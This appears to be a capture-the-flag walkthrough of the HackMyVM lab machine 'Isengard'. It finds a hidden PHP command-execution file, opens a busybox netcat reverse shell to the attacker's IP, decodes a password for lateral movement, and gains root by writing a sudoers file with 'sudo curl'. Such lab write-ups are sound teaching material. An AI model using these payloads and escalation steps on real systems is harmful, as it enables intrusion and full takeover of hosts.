# Isengard

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Isengard | bit | Beginner | HackMyVM |

**Summary:** Isengard is a Lord of the Rings themed beginner machine hosted on HackMyVM. The attack begins with a network scan revealing a single open HTTP port running Apache 2.4.51. The web application's homepage presents Tolkien-themed quotes styled in green terminal text on a black background, and crucially renders its own hidden directory path encoded in Tengwar (Elvish) script as a visual easter egg. A hidden comment inside the site's CSS file leaks a secret URL path `/y0ush4lln0tp4ss`. Navigating to that path reveals a Gandalf meme hinting to "look to the east", which directly corresponds to a subdirectory named `/east/` discovered during directory enumeration. Inside that directory, a PHP file named `mellon.php` (Elvish for "friend", referencing the famous "Speak, friend, and enter" inscription) exposes an unauthenticated Remote Code Execution vulnerability via a GET parameter named `frodo`. This allows obtaining a reverse shell as `www-data`. Post-exploitation enumeration uncovers a deeply nested chain of hidden directories in `/opt/` containing a ZIP archive with a double-base64 encoded password. Decoding the password allows lateral movement to the user `sauron`. Privilege escalation is achieved by abusing a `sudo` rule that permits `sauron` to run `/usr/bin/curl` as root without restrictions. Using the GTFOBins technique for `curl`'s file-write capability, a crafted sudoers drop-in file is written to `/etc/sudoers.d/`, granting `sauron` full passwordless `sudo` access and immediately escalating to a full root shell.

---

## Reconnaissance

### Host Discovery

The target machine was identified on the local network using a custom PowerShell scanning script. The scan revealed a single VirtualBox virtual machine at `192.168.100.146`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.146 08:00:27:C0:8F:82 VirtualBox
```

### Port Scanning

A full TCP port scan was launched against the target using Nmap with service and script detection enabled. Only a single port was found open: port 80 running Apache httpd 2.4.51 on Debian. The HTTP title identified the site as "Gray wizard".

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ nmap -sC -sV -p- -T4 192.168.100.146
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 12:56 WIB
Nmap scan report for 192.168.100.146
Host is up (0.067s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Gray wizard
|_http-server-header: Apache/2.4.51 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 IP address (1 host up) scanned in 38.28 seconds
```

### Web Application Enumeration

Browsing to port 80 reveals a Lord of the Rings themed page styled with green terminal text on a black background. Notably, the page also renders text written in **Tengwar** (the Elvish script referenced by the CSS comment), which encodes the hidden path `/y0ush4lln0tp4ss` as a thematic visual clue.

![](image.png)

Inspecting the page's HTML source revealed minimal content and a reference to an embedded wizard image:

```javascript

 <!DOCTYPE html>
<html>
<head>
<title>Gray wizard</title>
<link href="main.css" rel="stylesheet" type="text/css">
</head>
<body>

<p class="p1">It is the small things, everyday deeds of ordinary folk that keeps the darkness at bay. Simple acts of love and kidness.</p>
<p class="p">The world is not in your books and maps... It is out there!</p><br><br>
<img src="awizardisneverlate.jpg"/>




</body>
</html> 
```

The embedded image `awizardisneverlate.jpg` was downloaded but yielded no useful steganographic or metadata information.

### CSS Comment Leaks Hidden Path

Retrieving `main.css` exposed a highly valuable comment left by the developer. The comment reads as an internal to-do note but inadvertently discloses a secret URL path that was intended to be added to `robots.txt`:

```css
@import url('https://fonts.googleapis.com/css?family=VT323&subset=latin-ext');
/* To do:
   Add tengwar annatar font from fontmeme*/

* {
  margin: 0;
  padding: 0;
}
body {
  padding: 2.7rem;
  background-color: #000;
  color: lime;
  font-family: 'VT323', monospace;

}

p {
  font-size: 1.5rem;
  text-shadow: 0px 0px 2px GreenYellow;
  line-height: 1.7rem;
}
.p:after {
  content: "";
  display: inline-block;
  width: 0.7rem;
  height: 1.1rem;
  background-color: lime;
  box-shadow: 0px 0px 1px GreenYellow;
  animation-name: dot;
  animation-duration: 0.9s;
  animation-iteration-count: infinite;
}
@keyframes dot {
  from {
    background-color: lime;
    box-shadow: 0px 0px 2px GreenYellow;
  }
  to {
    background-color: #000500;
    box-shadow: 0px 0px 2px #000500;
  }
}
...
/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */
```

The comment `/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */` directly reveals a hidden directory. While `robots.txt` itself was not present on the server, navigating to `/y0ush4lln0tp4ss` worked successfully. The path is a stylized variant of "You shall not pass", Gandalf's iconic phrase.

### Hidden Directory: /y0ush4lln0tp4ss

Accessing `http://192.168.100.146/y0ush4lln0tp4ss/` displays a Gandalf meme. The image is named `l00kt0myc00ming.jpg`, and the page source also contains a commented-out reference to `2.jpg`. More significantly, the meme text reads **"LOOK TO MY COMING ON THE FIRST LIGHT OF THE THIRD DAY"** and **"AT DAWN LOOK TO THE EAST"**, which is a direct hint toward a subdirectory named `/east/`.

![alt text](image-1.png)

The HTML source at this path confirmed the hints:

```javascript

 <!DOCTYPE html>
<html>
<head>
<title>Gray wizard</title>
<link href="main.css" rel="stylesheet" type="text/css">
</head>
<body>
<br>
<center><img src="l00kt0myc00ming.jpg"/></center>

<!-- <img src="2.jpg" /> -->



</body>
</html> 
```

### Directory Enumeration with Feroxbuster

A recursive directory and file brute-force scan was launched against the `/y0ush4lln0tp4ss/` path to enumerate all available content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ feroxbuster -u http://192.168.100.146/y0ush4lln0tp4ss/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,jpg,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.146/y0ush4lln0tp4ss
 🚩  In-Scope Url          │ 192.168.100.146
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, jpg, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      328c http://192.168.100.146/y0ush4lln0tp4ss => http://192.168.100.146/y0ush4lln0tp4ss/
200      GET      578l     2957w   244076c http://192.168.100.146/y0ush4lln0tp4ss/3.jpg
400      GET       10l       35w      307c http://192.168.100.146/y0ush4lln0tp4ss/F%EF%BF%BDH%EF%BF%BDD%EF%BF%BD%EF%BF%BD%S
200      GET      211l     1506w   112817c http://192.168.100.146/y0ush4lln0tp4ss/2.jpg
301      GET        9l       28w      333c http://192.168.100.146/y0ush4lln0tp4ss/east => http://192.168.100.146/y0ush4lln0tp4ss/east/
200      GET       30l      142w    10388c http://192.168.100.146/y0ush4lln0tp4ss/east/ring.zip
```

The scan confirmed the `/east/` subdirectory (matching the Gandalf hint) and revealed two key items inside it: `ring.zip` and, after the scan completed, `mellon.php`.

### Rabbit Hole: ring.zip (Web)

While waiting for the feroxbuster scan to finish, the publicly accessible `ring.zip` from the `/east/` directory was downloaded and inspected:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ wget http://192.168.100.146/y0ush4lln0tp4ss/east/ring.zip
--2026-03-06 13:06:18--  http://192.168.100.146/y0ush4lln0tp4ss/east/ring.zip
Connecting to 192.168.100.146:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6042 (5.9K) [application/zip]
Saving to: 'ring.zip'

ring.zip       100%   5.90K  --.-KB/s    in 0.02s

2026-03-06 13:06:18 (331 KB/s) - 'ring.zip' saved [6042/6042]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ file ring.zip
ring.zip: Zip archive data, made by v6.3, extract using at least v2.0, last modified Nov 12 2021 01:12:10, uncompressed size 0, method=store

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ unzip ring.zip
Archive:  ring.zip
   creating: the/
   creating: the/best/
   creating: the/best/secret/
   creating: the/best/secret/is/
   creating: the/best/secret/is/here/
  inflating: the/best/secret/is/here/password
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/best/secret/is/here]
└─$ ls -la
total 20
drwxr-xr-x 2 ouba ouba  4096 Nov 12  2021 .
drwxr-xr-x 3 ouba ouba  4096 Nov 12  2021 ..
-rw-r--r-- 1 ouba ouba 11974 Nov 12  2021 password

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/best/secret/is/here]
└─$ cat password
 When Mr. Bilbo Baggins of Bag End announced that he would shortly be
celebrating his eleventy-first birthday with a party of special magnificence,

there was much talk and excitement in Hobbiton.

     Bilbo was very rich and very peculiar, and had been the wonder of the
...
smokes, and lights. His real business was far more difficult and dangerous

 //
 ('>
 /rr
*\))_       
```

This file contains an excerpt from The Lord of the Rings followed by an ASCII art rabbit, and is a deliberate rabbit hole designed to waste the attacker's time. It contains no usable credentials.

---

## Initial Access

### Parameter Fuzzing: mellon.php

After the feroxbuster scan completed, a new endpoint was discovered: `mellon.php` at `http://192.168.100.146/y0ush4lln0tp4ss/east/mellon.php`. The name "mellon" means "friend" in Elvish, referencing the "Speak, friend, and enter" gate inscription from the story. Opening the URL in a browser returned a blank page, indicating the PHP file exists but requires a parameter. The file was fuzzed for GET parameter names using `ffuf` with a filter on response word count to eliminate blank default responses:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/best/secret/is/here]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u "http://192.168.100.146/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id" -fw 1

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.146/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

frodo                   [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 129ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The parameter name `frodo` was identified. A quick `curl` request confirmed unauthenticated Remote Code Execution running as `www-data`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/best/secret/is/here]
└─$ curl http://192.168.100.146/y0ush4lln0tp4ss/east/mellon.php?frodo=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

A netcat listener was set up on the attacker machine, and the RCE was triggered via a URL-encoded busybox reverse shell payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

```url
http://192.168.100.146/y0ush4lln0tp4ss/east/mellon.php?frodo=busybox%20nc%20192.168.100.1%204444%20-e%20/bin/bash
```

A connection was received and the shell was immediately upgraded to a fully interactive PTY using Python's `pty` module, followed by terminal environment stabilization:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 49662
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/isengard]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ export TERM=xterm-256color
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ export SHELL=/bin/bash
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ stty rows 50 cols 200
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$
```

### Web Directory Inspection

Listing the `/east/` directory contents and reviewing the PHP file confirmed the vulnerability's simplicity. The `mellon.php` script directly passes the GET parameter into `system()` with no sanitization whatsoever:

```bash
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ ls -la
total 84
drwxr-xr-x 2 root root  4096 Nov 11  2021 .
drwxr-xr-x 3 root root  4096 Nov 11  2021 ..
-rw-r--r-- 1 root root   285 Nov 11  2021 index.html
-rw-r--r-- 1 root root    47 Nov  2  2021 main.css
-rwxrwxrwx 1 root root    33 Nov 11  2021 mellon.php
-rw-r--r-- 1 root root    54 Nov 11  2021 oooREADMEooo
-rw-r--r-- 1 root root  6042 Nov 11  2021 ring.zip
-rw-r--r-- 1 root root 51658 Nov  2  2021 speakfriendandenter.jpg
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ cat oooREADMEooo
it is not easy to find the unique ring
keep searching
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ cat mellon.php
<?php system($_GET['frodo']); ?>
```

---

## Internal Enumeration

### User Discovery

Examining `/etc/passwd` for users with a shell revealed two accounts: `root` and `sauron`. The `sauron` home directory was locked down with no read permissions for `www-data`:

```bash
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
sauron:x:1000:1000:sauron,,,:/home/sauron:/bin/bash
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ ls -la /home/sauron/
ls: cannot open directory '/home/sauron/': Permission denied
```

### Hidden Nested Directory Chain in /opt

Exploring the `/opt` directory uncovered a deeply nested chain of hidden directories (each name prefixed with a dot to hide them from casual `ls` output). The directory names are thematic LOTR references designed to discourage exploration. The chain culminated in a world-writable directory `.ok_butDestroyIt` containing a second `ring.zip` archive:

```bash
www-data@isengard:/tmp$ cd /opt
www-data@isengard:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 11  2021 .
drwxr-xr-x 18 root root 4096 Nov 11  2021 ..
drwxr-xr-x  3 root root 4096 Nov 11  2021 .nothingtoseehere
www-data@isengard:/opt$ cd .nothingtoseehere/
www-data@isengard:/opt/.nothingtoseehere$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
drwxr-xr-x 3 root root 4096 Nov 11  2021 .donotcontinue
www-data@isengard:/opt/.nothingtoseehere$ cd .donotcontinue/
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
drwxr-xr-x 3 root root 4096 Nov 11  2021 .stop
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue$ cd .stop/
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
drwxr-xr-x 3 root root 4096 Nov 11  2021 .heWillKnowYouHaveIt
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop$ cd .heWillKnowYouHaveIt/
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
drwxr-xr-x 3 root root 4096 Nov 11  2021 .willNotStop
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt$ cd .willNotStop/
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
drwxrwxrwx 2 root root 4096 Nov 11  2021 .ok_butDestroyIt
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop$ cd .ok_butDestroyIt/
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Nov 11  2021 .
drwxr-xr-x 3 root root 4096 Nov 11  2021 ..
-rwxrwxrwx 1 root root  187 Nov 11  2021 ring.zip
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt$ file ring.zip
ring.zip: Zip archive data, at least v1.0 to extract
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt$ which unzip
/usr/bin/unzip
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt$ cp ring.zip /tmp/ring.zip
www-data@isengard:/opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt$ cd /tmp/
www-data@isengard:/tmp$ unzip ring.zip
Archive:  ring.zip
 extracting: ring.txt
www-data@isengard:/tmp$ cat ring.txt
ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==
```

### Double Base64 Decoding to Recover Password

The contents of `ring.txt` are a base64-encoded string. Decoding it once yields another base64-encoded string. Decoding that second layer reveals a plaintext password for the `sauron` user:

```bash
www-data@isengard:/tmp$ which base64
/usr/bin/base64
www-data@isengard:/tmp$ echo 'ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==' | base64 -d
eVhLTXc1d3BTQXJMMkNMWAo=
www-data@isengard:/tmp$ echo 'eVhLTXc1d3BTQXJMMkNMWAo=' | base64 -d
yXK[REDACTED]
```

### Lateral Movement to sauron

Using the recovered password, lateral movement to the `sauron` user account was achieved via `su`. The user is a member of the `sudo` group, which immediately makes privilege escalation a priority:

```bash
www-data@isengard:/tmp$ su - sauron
Password:
sauron@isengard:~$ id
uid=1000(sauron) gid=1000(sauron) groups=1000(sauron),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev)
sauron@isengard:~$ ls -la
total 28
drwx------ 3 sauron sauron 4096 Nov 11  2021 .
drwxr-xr-x 3 root   root   4096 Nov 11  2021 ..
lrwxrwxrwx 1 sauron sauron    9 Nov 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 sauron sauron  220 Nov 11  2021 .bash_logout
-rw-r--r-- 1 sauron sauron 3526 Nov 11  2021 .bashrc
drwxr-xr-x 3 sauron sauron 4096 Nov 11  2021 .local
-rw-r--r-- 1 sauron sauron  807 Nov 11  2021 .profile
-rw-r--r-- 1 root   root     19 Nov 11  2021 user.txt
```

---

## Privilege Escalation

### Sudo Enumeration

Running `sudo -l` revealed that `sauron` is permitted to execute `/usr/bin/curl` as any user with no password required:

```bash
sauron@isengard:~$ sudo -l
[sudo] password for sauron:
Matching Defaults entries for sauron on isengard:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sauron may run the following commands on isengard:
    (ALL) /usr/bin/curl
```

### GTFOBins: curl File Write

Consulting GTFOBins for `curl` under the Sudo category reveals the **File write** technique. Because `curl` is executed via `sudo` and does not drop privileges, it can read any local file and write it to any destination path on the filesystem — including privileged locations such as `/etc/sudoers.d/`. The technique uses `curl file:///path/to/source -o /path/to/destination` to perform the arbitrary write.

![alt text](image-2.png)

### Crafting the Sudoers Drop-in File

A sudoers drop-in file was created in `sauron`'s home directory granting `sauron` full passwordless sudo access for all commands. The file permissions were set to `0440` as required by the sudoers format (world-writable sudoers files are rejected by `sudo`):

```bash
sauron@isengard:~$ nano sauron
sauron@isengard:~$ cat sauron
sauron ALL=(ALL:ALL) NOPASSWD:ALL
sauron@isengard:~$ chmod 0440 sauron
```

### Exploiting curl to Write to /etc/sudoers.d/

The crafted file was then written to `/etc/sudoers.d/sauron` using `sudo curl` with the `file://` URI scheme, leveraging root privileges to place it in a protected directory:

```bash
sauron@isengard:~$ sudo /usr/bin/curl file:///home/sauron/sauron -o /etc/sudoers.d/sauron
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    34  100    34    0     0  34000      0 --:--:-- --:--:-- --:--:-- 34000
```

### Root Shell

With the drop-in sudoers file in place, `sudo -i` was executed to obtain a full root shell. Both flags were then read:

```bash
sauron@isengard:~$ sudo -i
root@isengard:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
isengard
root@isengard:~# cat /home/sauron/user.txt /root/root.txt
HMV{Y0u[REDACTED]}
HMV{Y0u[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified a single host at `192.168.100.146`. Full Nmap port scan revealed only port 80 open, running Apache 2.4.51 on Debian with an HTTP title of "Gray wizard".

2. **Vulnerability Discovery**: The site's `main.css` stylesheet contained a developer comment leaking the hidden URL path `/y0ush4lln0tp4ss`. The page at that path displayed a Gandalf meme with the text "AT DAWN LOOK TO THE EAST", hinting at the `/east/` subdirectory. Feroxbuster enumeration of `/y0ush4lln0tp4ss/` discovered the directory `/east/` and the PHP file `mellon.php`. Parameter fuzzing with `ffuf` identified the GET parameter `frodo` as the command injection point in `mellon.php`, which was confirmed to execute OS commands directly via `<?php system($_GET['frodo']); ?>`.

3. **Exploitation**: A busybox reverse shell payload was delivered through the `frodo` parameter, establishing a shell as `www-data`. The shell was upgraded to a fully interactive PTY using Python's `pty` module and stabilized with `stty`.

4. **Internal Enumeration**: `/etc/passwd` revealed the user `sauron`. Exploration of `/opt` uncovered a chain of six nested hidden directories terminating in a world-writable directory containing `ring.zip`. Extracting the archive yielded `ring.txt`, a double-base64 encoded string which decoded to the plaintext password for `sauron`. The password was used with `su` to move laterally to the `sauron` account.

5. **Privilege Escalation**: `sudo -l` showed `sauron` could run `/usr/bin/curl` as root without a password. Using the GTFOBins file-write technique for `curl` under sudo, a custom sudoers drop-in file (`sauron ALL=(ALL:ALL) NOPASSWD:ALL`) was written to `/etc/sudoers.d/sauron` via `sudo curl file:///home/sauron/sauron -o /etc/sudoers.d/sauron`. Running `sudo -i` immediately granted a root shell, and both the user and root flags were retrieved.

